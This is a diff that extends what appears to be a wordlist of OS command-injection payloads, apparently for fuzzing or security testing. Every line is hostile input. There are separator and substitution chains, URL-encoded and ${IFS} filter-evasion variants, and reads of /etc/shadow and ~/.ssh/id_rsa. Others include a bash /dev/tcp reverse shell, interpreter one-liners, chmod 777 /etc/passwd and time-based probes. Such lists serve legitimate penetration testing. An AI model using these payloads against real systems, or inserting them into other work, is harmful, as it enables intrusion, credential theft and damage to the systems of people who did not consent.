@@ -1,3 +1,99 @@
+; ls
+| ls
+`ls`
+$(ls)
+& ls
+&& ls
+|| ls
 ; id
-&& id
 | id
+`id`
+$(id)
+& id
+&& id
+|| id
+; whoami
+| whoami
+`whoami`
+$(whoami)
+; cat /etc/passwd
+| cat /etc/passwd
+`cat /etc/passwd`
+$(cat /etc/passwd)
+; cat /etc/shadow
+; uname -a
+| uname -a
+; hostname
+; ifconfig
+; ip addr
+; ps aux
+; env
+; printenv
+; pwd
+; ls -la
+; ls -la /
+; ls -la /etc
+; ls -la /var/www
+; find / -perm -u=s -type f
+; ping -c 1 127.0.0.1
+; curl http://127.0.0.1
+; wget http://127.0.0.1
+; nc -zv 127.0.0.1 80
+; echo hello
+; echo $HOME
+; echo $PATH
+; echo $USER
+; sleep 5
+| sleep 5
+`sleep 5`
+$(sleep 5)
+; bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+; python3 -c 'import socket,subprocess,os;...'
+; php -r 'exec("id");'
+; perl -e 'system("id");'
+; ruby -e 'exec("id")'
+; lua -e 'os.execute("id")'
+$(echo hello)
+`echo hello`
+;echo hello
+|echo hello
+%0aid
+%0als
+%0awhoami
+
+id
+
+ls
+%0a%0aid
+%0a%0als
+
+id
+%3bid
+%7cid
+%26id
+%60id%60
+%24%28id%29
+;${IFS}id
+|${IFS}ls
+;a=id;$a
+;a=l;b=s;$a$b
+;&& id
+;||id
+;^id
+;` id`
+; echo test > /tmp/pwned
+; touch /tmp/pwned
+; mkdir /tmp/test
+; chmod 777 /etc/passwd
+; cat ~/.ssh/id_rsa
+; ls ~/.ssh/
+; crontab -l
+; cat /proc/version
+; cat /proc/cmdline
+; cat /etc/os-release
+; df -h
+; free -m
+; top -n 1
+; netstat -an
+; ss -an
+; route -n
